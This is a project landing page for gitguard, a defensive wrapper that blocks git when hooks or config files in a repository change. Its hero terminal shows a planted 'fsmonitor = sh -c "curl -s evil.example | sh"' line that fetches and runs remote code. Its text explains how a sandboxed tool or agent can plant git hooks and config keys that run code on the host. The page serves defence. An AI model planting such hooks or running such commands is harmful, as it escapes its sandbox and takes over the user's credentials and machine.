---
layout: default
title: gitguard
description: A guard that refuses to run git on a repository whose trusted files changed since you last looked. One Python file, standard library only.
hero:
  title: Your sandbox can write to <code>.git</code>. The next <code>git</code> you type runs what it wrote.
  lede: gitguard stands in front of git. It fingerprints the files that can make git execute code, and refuses to run git when they change.
  meta: One Python file, standard library only. Linux and macOS, Python 3.9 or later. MIT.
  caption: What you see when a hook and a config key appeared while an agent worked in the repository
  term_title: you@host — ~/work/api
---
{% capture hero_term %}
<span class="p">$</span> git status
<span class="hr">────────────────────────────────────────────────────────</span>
<span class="w">!</span> gitguard: <span class="b">~/work/api/.git has changed since the last trust</span>
  <span class="mod">modified</span>  config
  <span class="add">added</span>     hooks/pre-commit

  diff of ~/work/api/.git/config:
  <span class="hint">@@ -5,3 +5,4 @@</span>
   	logallrefupdates = true
   	ignorecase = true
   	precomposeunicode = true
  <span class="add">+	fsmonitor = sh -c "curl -s evil.example | sh"</span>

<span class="hr">────────────────────────────────────────────────────────</span>
  <span class="hint">If legitimate:  gitguard trust      Otherwise:  gitguard restore</span>
<span class="x big">✗ gitguard: refusing to run git.</span>
{% endcapture %}
{% include hero.html term=hero_term %}

<section id="pivot" class="prose" markdown="1">

## How the pivot works

You give a tool you do not fully trust write access to a directory that holds git repositories. Sandboxed or not, in a container or not, if the repository is mounted in, the tool can write into the work tree, and `.git/` sits inside the work tree. That is the whole point of the access.

From there the code can drop a script in `.git/hooks/`, add a key such as `core.fsmonitor` or `core.sshCommand` to `.git/config`, point `include.path` at a file it controls, plant a nested repository in a subdirectory, or replace `.git` itself with a `gitdir:` file. None of this runs inside the sandbox. It waits.

It runs the next time you type `git` on the host, with your SSH keys, your credentials and your shell. The sandbox never had to escape. You carried the payload across the boundary yourself.

Prevention layers help and are independent of gitguard: a seccomp or AppArmor profile forbidding writes under `.git/`, a global `core.hooksPath`, an unmapped uid in a rootless container, and `safe.bareRepository=explicit`, which you should set in every case. gitguard is the detection layer underneath. It refuses to run git until you have looked.

</section>

<section id="attacks" markdown="1">

## Five basic attacks, with and without gitguard

Each scenario starts from a repository you trusted. The sandbox writes something. You come back and type an ordinary command. Pick one.
{:.prose style="margin:0"}

{% include attacks.html %}

</section>

<section id="fingerprint" markdown="1">

## A fingerprint, not a blocklist

<div class="prose" markdown="1">

gitguard does not look for dangerous keys in the config. A blocklist chases git's CVEs and is always one key short. Instead `gitguard trust` records a sha256 of every file that can serve the pivot, and every later `git` is checked against that reference first. A false negative on those files is impossible. The price is an explicit `gitguard trust` when you change your own hooks or config.

Inside `.git/` the rule is inverted. Everything is watched, at any depth, except what git rewrites during normal operation. An unknown file is suspicious by default. Commit, checkout, merge, rebase, stash, bisect, gc and fsck stay silent.

</div>

<div class="watch" markdown="1">
<div markdown="1">

A gitdir as gitguard sees it. Dimmed lines are rewritten by git and ignored.
{:.cap}

{% include gitdir-tree.html %}

</div>
<div class="also" markdown="1">

Also fingerprinted, outside `.git/`
{:.cap}

.gitmodules  .lfsconfig  sub/.git
: Tree files that drive git: submodule declarations, LFS transfer programs, the gitfile of each submodule or nested worktree.

core.hooksPath = .githooks
: The directory the config names, with husky, lefthook or pre-commit inside it. A sandbox that can only write the tree rewrites those hooks without touching `.git`.

remote.origin.url = ../other.git
: A local remote: the config and hooks of the repository `push` enters, opened as git opens it (gitfile, `commondir`). `git push <path>` and `git archive --remote=<path>` to a repository no remote names are refused: make it a remote, trust, retry. A remote is a name the config gives a url. Outside any repository, `git archive --remote=<path>` to a local repository is refused too: run `git -C <path> archive` instead.

include.path  includeIf
: Followed recursively to git's own depth of ten, each file hashed.

alias.ac = !sh tool.sh
: Any token of a config value that exists as a file in the tree. `core.pager = cat` does not count, since `cat` is not in the tree.

~/.gitconfig  /etc/gitconfig
: Parsed with the same parser, never with `git config`, which would honour the config being judged. A global `core.hooksPath` into a mounted volume is a complete bypass otherwise.

</div>
</div>

</section>

<section id="install" markdown="1">

## Install

{:.steps}
1. Put the script on your path.

   ```console
   $ install -m 755 gitguard.py ~/bin/gitguard
   ```

2. Make `git` go through it: a symlink named `git` in a directory ahead of the real one in your `PATH`. gitguard notices it was called `git` and switches to exec mode. You are not the only one running git: shell prompts, editors and build tools call it by name, and oh-my-zsh does so with `command git`, which skips aliases. A planted `core.fsmonitor` fires the moment you `cd` into the directory. The symlink wraps all of them; an alias wraps only what you type.

   ```console
   $ ln -s ~/bin/gitguard ~/bin/git
   # or, for the git you type only
   $ alias git='gitguard git'
   ```

   System-wide on Debian: `dpkg-divert` the real git to `/usr/bin/git.real` and symlink `/usr/bin/git` to gitguard. gitguard finds a `git.real` next to itself; `git-receive-pack`, `git-upload-pack` and `git-upload-archive`, symlinks to `git` that sshd runs for every push and fetch to the machine, pass straight through to the real git. On macOS keep the `PATH` symlink and set `git.path` in VS Code.

3. Set the companion setting git already ships. It is independent of gitguard and closes a hole gitguard cannot reach from tools that bypass the wrapper.

   ```console
   $ git config --global safe.bareRepository explicit
   ```

4. Trust each repository you already have, after a look at its `config` and `hooks/`: nothing is blessed unseen, there is no trust-on-first-use. A `clone` or `init` made through the wrapper is trusted on its own.

   ```console
   $ cd ~/work/api && cat .git/config && ls -la .git/hooks
   $ gitguard trust
   ✓ gitguard: trust state recorded for /home/user/work/api
   ```

</section>

<section id="daily" markdown="1">

## Day to day

<div class="two" markdown="1">
<div class="prose" markdown="1">

Commit, checkout, merge, rebase, stash, bisect, gc, worktree and submodule operations touch only files gitguard does not watch, so you never hear from it; `git --version` is never checked at all. When something did change, three cases.

**Auto-accept.** The change is one git or your editor made itself: `push -u`, `branch -u` and `checkout -b` write `branch.x.remote` (a remote already known) and `branch.x.merge` (a `refs/heads/…`), VS Code writes `branch.x.vscode-merge-base` (a ref name) when it opens a repository. If the only file that changed is the config and its semantic difference is limited to those lines, gitguard updates the reference itself, prints one line and runs git. A closed allowlist of three keys that cannot make git execute anything, not a blocklist; a lone comment or a `branch.x.rebase` still gets the question. Not to be confused with auto-trust, which blesses a *new* repository after a `clone` or `init` through the wrapper.

**Anything else.** The diff is shown, then a question on the terminal: trust this state and run git, default no. The question goes through `/dev/tty`, so git's stdin is left alone. No question without a terminal, with stdout or stderr redirected, or with `GITGUARD_NO_PROMPT=1`.

**Never trusted, or structurally wrong.** A symlinked `.git`, a bare gitdir in a subdirectory, an `exec` line injected into a rebase, a control character in a name. No question is asked. Fix it, or trust it explicitly.

**A program ran git.** An editor's polling, a build tool, cron: no terminal, nobody reads its stderr. gitguard records what it saw, sends one desktop notification and waits up to `GITGUARD_WAIT` seconds. In a terminal, `gitguard pending` lists what waits; `gitguard pending <repo>` shows the diff and the calling process, then asks. Allowing records what you were shown and lets the waiting git run; refusing makes it fail and clears the record. A decision taken after the timeout applies to the next invocation. A git that has a terminal, such as a prompt's `$(git …)`, is refused at once instead: blocking it would freeze your shell.

What you say yes to is exactly what you were shown. gitguard saves the state it diffed, never a fresh scan taken after your answer.

**A change to your global config** (`git config --global`, `git lfs install`) marks every registered repository modified at once. `gitguard retrust` shows that diff once and asks once for all the repositories it is the only change of.

Tried on Debian with the system-wide install, on a repository modified behind the user's back: starship, oh-my-zsh, fish and `__git_ps1` prompts go quiet with no delay; powerlevel10k keeps showing branch and status, since `gitstatusd` reads `.git` itself and never runs git; lazygit exits with gitguard's message, tig says "Not a git repository"; fugitive's `:Git` shows the refusal after `GITGUARD_WAIT`; VS Code's polling waits for your `gitguard pending`; pre-commit's hook runs with the real git.

</div>
<div markdown="1">

A legitimate change, accepted from the terminal
{:.cap}

{% capture t %}
<span class="p">$</span> git remote add upstream git@github.com:org/api.git
<span class="p">$</span> git fetch upstream
<span class="hr">────────────────────────────────────────────────────────</span>
<span class="w">!</span> gitguard: <span class="b">~/work/api/.git has changed since the last trust</span>
  <span class="mod">modified</span>  config

  diff of ~/work/api/.git/config:
  <span class="hint">@@ -8,3 +8,6 @@</span>
   [branch "main"]
   	remote = origin
   	merge = refs/heads/main
  <span class="add">+[remote "upstream"]</span>
  <span class="add">+	url = git@github.com:org/api.git</span>
  <span class="add">+	fetch = +refs/heads/*:refs/remotes/upstream/*</span>

<span class="hr">────────────────────────────────────────────────────────</span>
<span class="w">Trust this state and run git? [y/N]</span> y
<span class="ok">✓</span> gitguard: trust state recorded for /home/user/work/api
From github.com:org/api
 * [new branch]      main       -&gt; upstream/main
{% endcapture %}
{% include term.html title="you@host — ~/work/api" body=t %}

When it was not you
{:.cap style="margin-top:1.4rem"}

{% capture t %}
<span class="p">$</span> gitguard diff
<span class="w">!</span> gitguard: changes in ~/work/api/.git:
  <span class="add">added</span>     hooks/pre-commit
<span class="p">$</span> gitguard restore
Actions on /home/user/work/api:
  <span class="x">delete</span>    hooks/pre-commit
<span class="w">Continue? [y/N]</span> y
<span class="ok">✓</span> gitguard: 1 file(s) restored, /home/user/work/api
  matches the trusted state again
{% endcapture %}
{% include term.html title="you@host — ~/work/api" body=t %}

When your editor ran git, not you
{:.cap style="margin-top:1.4rem"}

{% capture t %}
<span class="p">$</span> gitguard pending
<span class="mod">changed</span>         4s  1 waiting  /home/user/work/api
  <span class="hint">gitguard pending &lt;repo&gt;  to see the diff and decide  -a: all</span>
<span class="p">$</span> gitguard pending ~/work/api
/home/user/work/api  [changed, since 6s]
    git waiting (pid 41250, 6s): code[40988] ← systemd[1]
      /usr/share/code/code --type=utility
<span class="hr">────────────────────────────────────────────────────────</span>
  <span class="add">added</span>     hooks/pre-commit
<span class="hr">────────────────────────────────────────────────────────</span>
<span class="w">Allow: record this state and let the waiting git run? [y/N]</span> n
<span class="w">!</span> gitguard: refused: the waiting git is not run;
  the record is cleared. If malicious:  gitguard restore
{% endcapture %}
{% include term.html title="you@host — ~/work/api" body=t %}

</div>
</div>

</section>

<section id="commands" markdown="1">

## Commands and settings

<div class="tablewrap" markdown="1">

| Command | What it does |
|---|---|
| `gitguard` | Check the current repository. Exit 1 if suspect or never trusted. Reports, never asks. |
| `gitguard trust` | Record the current state as the reference, with a backup of the watched files. |
| `gitguard diff` | Show what differs from the reference. |
| `gitguard restore [-y]` | Put the watched files of the gitdir and the tree back into the reference state. Only the pivot vector: commits, objects and tree files the sandbox left stay for you to inspect; a watched file outside the repository is named, never written. |
| `gitguard git <args>` | Check, then run the real git. Honours `-C`, `--git-dir`, `--work-tree`. |
| `gitguard list` | Every registered repository with its status: ok, modified, structure, missing, legacy, unknown. |
| `gitguard pending [<repo>… \| -a \| -c]` | Decisions waiting for a git blocked by a program: list them, review one (diff and calling process) and allow or refuse, or clear. |
| `gitguard forget <repo>…` | Remove entries. `--missing` removes repositories that no longer exist; `prune` is the same. |
| `gitguard retrust` | Re-validate the unchanged repositories in bulk after an upgrade that changed the fingerprint; a change to the global config (`git config --global`, `git lfs install`) is reviewed once for every repository it touches. |

</div>
<div class="tablewrap" markdown="1">

| Variable | Effect |
|---|---|
| `GITGUARD_STATE` | State directory. Default `$XDG_STATE_HOME/gitguard`, i.e. `~/.local/state/gitguard`, outside any mounted volume. Never move it into `.git`. |
| `GITGUARD_REAL_GIT` | Path to the real git. Default: a `git.real` next to gitguard, else the first `git` in the `PATH` that is not gitguard itself. |
| `GITGUARD_ALLOW_REBASE_EXEC=1` | Allow `exec` lines in rebase todo files, for people who use `rebase --exec`. |
| `GITGUARD_NO_PROMPT=1` | Never ask on the terminal. Refuse directly. |
| `GITGUARD_WAIT` | Seconds a git without a terminal waits for `gitguard pending`. Default 60, 0 never waits. |
| `GITGUARD_NO_NOTIFY=1` | No desktop notification. |
| `GITGUARD_DEBUG=1` | Full traceback on an internal error instead of a neutralised message. |
| `NO_COLOR` | No colours. |

</div>

</section>

<section id="limits" class="prose" markdown="1">

## What it does not do

- It only covers git invocations that resolve to the wrapper. A tool with a hardcoded path to the real git, or started with a `PATH` that does not contain the symlink, is not checked. A `-c key=value` given to such a git is invisible too.
- It cannot close the race between its check and git's execution if the sandbox is still writing. Stop the sandbox before running git on the host.
- `restore` only cleans the pivot vector. Objects, commits and tree files the sandbox dropped stay there for you to inspect, and so is a watched file outside the repository: restore never writes there.
- Hooks tracked *in the tree* under `core.hooksPath` (husky, `.githooks`) are watched, but a `checkout`, `merge` or `pull` of a commit the sandbox created rewrites them after the check, and git runs the new version in the same command. This is accepted, not fixed: versioned hooks are a decision to run what the repository contains, like `make` after a pull. `gitguard trust` warns when that layout is in place; review incoming changes to those files, or keep the hooks outside the tree with a global `core.hooksPath`.
- Every command except `status`, `diff`, `commit`, `config` and `var` (directly, or through an alias that resolves to one of them) runs with `-c diff.ignoreSubmodules=dirty`: a commit the sandbox created can bring a gitlink to a repository it planted in the tree, and the summary a `checkout`, a `merge` or a `stash pop` prints would otherwise run `git status` inside it, with its config, in the same command. Those summaries still show a submodule with new commits, no longer one whose own tree is merely dirty; `status`, `diff` and `commit` are unchanged (a shell alias such as `!git status` is not resolved and gets the option), and the next command on the repository is refused.
- A trusted hook that calls a program by name depends on your `PATH`. If a `PATH` directory sits in the mounted volume, that is out of reach.
- The question needs stdout and stderr on a terminal. A prompt's `$(git …)` or a `git log | head` on a changed repository is refused, not asked: rerun without the pipe, or `gitguard trust`.
- No desktop notification without a session (ssh, cron, systemd). The pending record is still written and the wait still times out; check `gitguard pending` by hand.
- Bare repositories are refused, not managed. `core.splitIndex` is refused: the gitlinks it needs to read live in `sharedindex.*`.
- Parity with git is checked against git itself in `tests/test_git_parity.py`; a gap found there is marked as an expected failure until fixed, and none is open at the moment. Deliberate, fail-closed divergences: a NUL byte or a line git dies on in a config file is refused.

The suite replays a catalogue of over eighty bypasses and false positives found over thirteen adversarial review passes, and requires a refusal for each one while ordinary git workflows stay silent. The catalogue, the review method and the design notes are in the repository.

</section>
